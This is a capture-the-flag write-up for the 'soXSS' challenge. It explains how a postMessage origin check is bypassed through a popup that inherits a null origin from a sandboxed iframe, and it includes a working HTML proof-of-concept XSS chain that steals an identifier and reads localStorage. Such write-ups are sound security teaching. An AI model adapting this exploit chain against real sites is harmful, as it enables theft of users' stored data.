<h1>soXSS - writeup</h1>

<h2>Introduction</h2>

<p>The <a href="https://twitter.com/terjanq/status/1446500485142355972">challenge</a> consisted of two components:
1. Text input for HTML notes.
2. Rendered HTML page from textarea, rendered inside an iframe.</p>

<p>The embedded iframe was within the same origin, but data sent to it was sanitized by <a href="https://github.com/cure53/DOMPurify">DOMPurify</a>.</p>

<h2>The idea</h2>

<p>The idea for the challenge was rather simple:
1. Bypass the below snippet included inside iframe.
<code>js
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e =&gt; {
  const data = e.data;
  if (e.origin !== window.origin &amp;&amp; data.identifier !== identifier) return;
  if (data.type === 'render') {
    renderContainer.innerHTML = data.body;
  }
}
</code>
2. Steal the identifier.
3. Steal the saved note from the main page with a valid identifier.</p>

<p><em>ðŸ’¡ The name of the challenge - soXSS - was referring to Same-Origin XSS.</em></p>

<h2>The solution</h2>

<p>One could <a href="https://so-xss.terjanq.me/index.php?source">notice</a> that the identifier was stored in a user's session and the session cookie was set to Lax. To solve the challenge the intended way was to bypass the following check <code>e.origin !== window.origin</code>. When <code>//example.org</code> is embeded into a sandboxed iframe, then the page's origin will be <code>null</code>, i.e. <code>window.origin === 'null'</code>. So just by embedding the iframe via <code>&lt;iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php"&gt;</code> we could force the <code>null</code> origin, only if the page was embeddable and cookies set to <code>SameSite=None</code>, but it wasn't the case for the challenge. The lesser known fact is that when the sandbox value <code>allow-popups</code> is set then the opened popup will inherit all the sandboxed attributes unless <code>allow-popups-to-escape-sandbox</code> is set. And that is the solution to the challenge: 
1. From a sandboxed page open a popup to <code>https://so-xss.terjanq.me/iframe.php</code>.
2. From any other <code>null</code> origin send a simple XSS to the popup and steal the identifier.
3. Open <code>https://so-xss.terjanq.me/iframe.php</code> and send XSS with stolen identifier so the origin is <code>so-xss.terjanq.me</code>.</p>

<p>All the steps are included in the below simple <a href="https://so-xss-hof.terjanq.me/poc.html">PoC</a>:</p>

<p>```html</p>

<p><body>
  <script>
    f = document.createElement('iframe');
    f.sandbox = 'allow-scripts allow-popups allow-top-navigation';
    const payload = <code>x=opener.top;opener.postMessage(1,'*');setTimeout(()=&gt;{
      x.postMessage({type:'render',identifier,body:'&lt;img/src/onerror=alert(localStorage.html)&gt;'},'*');
    },1000);</code>.replaceAll('\n',' ');
    f.srcdoc = <code>
    &lt;h1&gt;Click me!&lt;/h1&gt;
    &lt;script&gt;
      onclick = e =&gt; {
        let w = open('https://so-xss.terjanq.me/iframe.php');
        onmessage = e =&gt; top.location = 'https://so-xss.terjanq.me/iframe.php';
        setTimeout(_ =&gt; {
          w.postMessage({type: "render", body: "&lt;audio/src/onerror=\\"${payload}\\"&gt;"}, '*')
        }, 1000);
      };
    &lt;\/script&gt;
</code>
    document.body.appendChild(f);
  </script>
</body>
```</p>

<h2>Credits</h2>

<p>The challenge was created by <a href="https://twitter.com/ndevtk">NDevTK</a> and <a href="https://twitter.com/terjanq">terjanq</a>.</p>
